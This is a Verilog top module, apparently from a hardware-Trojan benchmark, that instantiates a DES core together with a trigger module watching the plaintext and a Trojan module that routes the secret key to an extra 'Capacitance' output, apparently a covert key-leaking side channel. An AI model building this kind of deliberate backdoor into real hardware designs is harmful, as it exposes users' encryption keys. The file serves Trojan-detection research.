`timescale 1ns / 1ps

module top(
	input clk, 
	input rst, 
    input decrypt,
    input [3:0] roundSel,
    input [55:0] key,
    input [63:0] desIn,
    output [63:0] desOut,
	output [63:0] Capacitance
    );

	wire Tj_Trig;

	des DES (
		.clk(clk),
		.roundSel(roundSel),
		.decrypt(decrypt),
		.key(key),
		.desIn(desIn),
		.desOut(desOut)); 
	Trojan_Trigger Trigger (rst, desIn, Tj_Trig); 
	TSC Trojan (rst, clk, Tj_Trig, key, Capacitance); 

endmodule
